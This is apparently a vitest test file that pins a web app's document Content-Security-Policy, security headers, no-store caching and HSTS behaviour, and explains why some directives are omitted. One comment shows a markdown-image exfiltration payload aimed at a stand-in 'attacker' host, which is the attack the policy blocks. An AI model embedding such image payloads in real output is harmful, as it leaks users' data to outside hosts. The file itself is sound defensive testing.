// @vitest-environment node

import { describe, expect, it } from "vitest";
import {
  DOCUMENT_CSP,
  withDocumentSecurityHeaders,
  withDocumentTransportSecurity,
} from "~/server/document-security.server";

/**
 * A19's second half. The design asked to confirm the existing CSP blocked outbound
 * sends; the answer was that documents had no CSP at all, only `/api` and `/mcp`
 * did. These tests pin what the new one does AND — just as important — what it
 * deliberately leaves out, because the omissions are the parts a later reader is
 * most likely to "fix" into an outage.
 */

function parse(csp: string): Map<string, string> {
  return new Map(
    csp.split(";").map((part) => {
      const [name, ...values] = part.trim().split(/\s+/u);
      return [name ?? "", values.join(" ")];
    }),
  );
}

describe("document CSP — closes the exfiltration channels", () => {
  const directives = parse(DOCUMENT_CSP);

  it("blocks an image request to any other host (the markdown-image channel)", () => {
    // The attack this closes: `![x](https://attacker/?d=<plan fragment>)` renders,
    // fires, and carries the WBS off — before anyone decides whether to approve.
    expect(directives.get("img-src")).toBe("'self' data:");
  });

  it("blocks fetch / XHR / WebSocket / beacon to any other host", () => {
    expect(directives.get("connect-src")).toBe("'self'");
  });

  it("closes the free ones: plugins, <base> hijacking, and framing", () => {
    expect(directives.get("object-src")).toBe("'none'");
    expect(directives.get("base-uri")).toBe("'none'");
    expect(directives.get("frame-ancestors")).toBe("'none'");
  });
});

describe("document CSP — the omissions are deliberate", () => {
  const directives = parse(DOCUMENT_CSP);

  it("does NOT set script-src or default-src, which would blank the app", () => {
    // `root.tsx` inlines a theme bootstrap and React Router inlines the hydration
    // context. Either directive without a nonce turns every page white. Doing it
    // properly is its own change, with its own verification.
    expect(directives.has("script-src")).toBe(false);
    expect(directives.has("default-src")).toBe(false);
  });

  it("does NOT set form-action, which would risk breaking Google sign-in", () => {
    // Sign-in POSTs to `/login`, which answers 302 to Google. Several browsers
    // apply `form-action` to the redirect FOLLOWING a submission, so this would
    // break auth in the environments hardest to notice from here — in exchange for
    // constraining injected forms, of which there are none.
    expect(directives.has("form-action")).toBe(false);
  });

  it("does not set style-src either, so React's inline style attributes keep working", () => {
    expect(directives.has("style-src")).toBe(false);
  });
});

describe("document CSP — applied without disturbing the response", () => {
  it("adds the header to an HTML response", async () => {
    const secured = withDocumentSecurityHeaders(
      new Response("<!doctype html><p>hi", {
        headers: { "content-type": "text/html" },
      }),
    );
    expect(secured.headers.get("Content-Security-Policy")).toBe(DOCUMENT_CSP);
    expect(await secured.text()).toBe("<!doctype html><p>hi");
  });

  it("preserves status, statusText and every other header", () => {
    const secured = withDocumentSecurityHeaders(
      new Response(null, {
        status: 302,
        statusText: "Found",
        headers: { location: "/login", "set-cookie": "a=b; HttpOnly" },
      }),
    );
    expect(secured.status).toBe(302);
    expect(secured.headers.get("location")).toBe("/login");
    expect(secured.headers.get("set-cookie")).toBe("a=b; HttpOnly");
    expect(secured.headers.get("Content-Security-Policy")).toBe(DOCUMENT_CSP);
  });

  it("carries an error response's header too", () => {
    // A thrown loader produces the response React Router renders from the error
    // boundary; it must not be the one page without a policy.
    const secured = withDocumentSecurityHeaders(new Response("boom", { status: 500 }));
    expect(secured.status).toBe(500);
    expect(secured.headers.get("Content-Security-Policy")).toBe(DOCUMENT_CSP);
  });

  it("carries the rest of the posture the browser surface was missing (M5)", () => {
    // Measured in production 2026-07-27, BEFORE this change: `/login` answered
    // with the CSP and nothing else, while `/api/health` — which no browser ever
    // requests — answered with all six. The care was on the surface that was
    // designed as a surface.
    const secured = withDocumentSecurityHeaders(new Response("<!doctype html>"));
    expect(secured.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(secured.headers.get("X-Frame-Options")).toBe("DENY");
    expect(secured.headers.get("Referrer-Policy")).toBe("no-referrer");
    expect(secured.headers.get("Permissions-Policy")).toBe(
      "camera=(), microphone=(), geolocation=(), payment=()",
    );
    expect(secured.headers.get("Cross-Origin-Opener-Policy")).toBe("same-origin");
    expect(secured.headers.get("Origin-Agent-Cluster")).toBe("?1");
  });

  it("marks documents no-store, so the plan is not in the cache after logout", () => {
    // `/projects/:id/wbs` embeds the whole grid in its SSR HTML and `/logout`
    // sends no `Clear-Site-Data`, so without this the back button shows another
    // company's effort data to whoever is at the machine next.
    expect(
      withDocumentSecurityHeaders(new Response("<!doctype html>")).headers.get("Cache-Control"),
    ).toBe("no-store");
  });

  it("does not overwrite a header the route deliberately set", () => {
    const secured = withDocumentSecurityHeaders(
      new Response("<!doctype html>", { headers: { "cache-control": "public, max-age=60" } }),
    );
    expect(secured.headers.get("Cache-Control")).toBe("public, max-age=60");
    // ...while the ones it did not set are still applied.
    expect(secured.headers.get("X-Content-Type-Options")).toBe("nosniff");
  });

  it("never widens a stricter policy a response already declared", () => {
    // `/api` and `/mcp` set `default-src 'none'`. Overwriting that from here would
    // be a downgrade delivered by a helper nobody was looking at.
    const strict = "default-src 'none'; frame-ancestors 'none'";
    const secured = withDocumentSecurityHeaders(
      new Response(null, { headers: { "Content-Security-Policy": strict } }),
    );
    expect(secured.headers.get("Content-Security-Policy")).toBe(strict);
  });
});

describe("HSTS — the header real users had never received (M5)", () => {
  const https = new Request("https://vecta.example.com/login");
  const http = new Request("http://localhost:5173/login");

  it("is sent over HTTPS", () => {
    // HSTS protects a HOST, but a browser only learns the policy from a response
    // it receives — and browsers never fetch `/api`, which was the only surface
    // sending it. So this host had never been pinned for a single real user.
    const secured = withDocumentTransportSecurity(https, new Response("<!doctype html>"));
    expect(secured.headers.get("Strict-Transport-Security")).toBe("max-age=31536000");
  });

  it("does NOT claim sibling subdomains", () => {
    // The app lives on a `workers.dev` subdomain, which is on the Public Suffix
    // List. `includeSubDomains` from here would reach outside what this Worker
    // owns — and it matches what `/api` already sends, so the two cannot drift.
    const value =
      withDocumentTransportSecurity(https, new Response("<!doctype html>")).headers.get(
        "Strict-Transport-Security",
      ) ?? "";
    expect(value).not.toContain("includeSubDomains");
    expect(value).not.toContain("preload");
  });

  it("is NOT sent over plain HTTP, where the spec says to ignore it", () => {
    const secured = withDocumentTransportSecurity(http, new Response("<!doctype html>"));
    expect(secured.headers.has("Strict-Transport-Security")).toBe(false);
  });

  it("preserves the response it wraps", async () => {
    const secured = withDocumentTransportSecurity(
      https,
      new Response(null, { status: 302, headers: { location: "/projects" } }),
    );
    expect(secured.status).toBe(302);
    expect(secured.headers.get("location")).toBe("/projects");
  });
});
